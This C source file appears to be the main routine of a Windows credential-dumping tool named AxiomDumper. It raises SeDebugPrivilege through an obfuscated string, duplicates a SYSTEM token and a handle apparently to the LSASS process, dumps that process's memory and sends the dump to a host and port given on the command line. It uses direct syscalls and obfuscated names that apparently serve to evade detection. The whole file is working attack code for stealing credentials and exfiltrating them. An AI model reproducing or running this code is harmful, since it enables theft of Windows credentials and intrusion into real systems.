#include <stdio.h>

#include "AxiomDumper.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char **argv)
{
    LUID luid = { 0,0 };
    void* buffer;
    int bufferSize = 0;
    BOOL success = false;

	AXIOM_Prepare_Syscalls();
    if (AXIOM_PrivCheck())
    {
        HANDLE duplicatedHandle = NULL;

        if (argc == 3 && drunk_strcmp(argv[1], "/PPcheck") == 0)
        {
            AXIOM_PPcheck(argv[2]);
            return (0);
        }
        else if ((argc == 2 && drunk_strcmp(argv[1], "/help") == 0) || argc != 3)
        {
            PRINT_USAGE(argv[0]);
            return (0);
        }

        LookupPrivilegeValueW(NULL, SecretWStrBuilder(STRBUILDER_SEDEBUG), &luid);
        DEBUG_LOG("SeDeb identified\n");
        AXIOM_PrivIncrease(luid);
        DEBUG_LOG("Got high privs\n");

        AXIOM_DuplicatePrivilegedToken(luid);
        DEBUG_LOG("Token duplicated\n");
        duplicatedHandle = AXIOM_HDuplicate();
        Sleep(2000);
        if (duplicatedHandle == NULL)
        {
            printf("[!] Could not duplicate a SYSTEM handle with necessary access rights, process has probably the RunAsPPL flag on\n");
            return (FALSE);
        }
        DEBUG_LOG("Handle duplicated\n");
        success = El_Sass(duplicatedHandle, (const void**)&buffer, &bufferSize);
        if (!success) {
            printf("[!] Failed\n");
        }
        DEBUG_LOG("Memory dumped, got %d bytes\n", bufferSize);
        Sleep(500);
        DEBUG_LOG("Sleep complete\n");

        AXIOM_NetworkEmitter(argv[1], drunk_atoi(argv[2]), (unsigned char *)buffer, bufferSize);
    }
    else {
        printf("[!] Not enough privileges\n");
        return (FALSE);
    }

    return (TRUE);
}
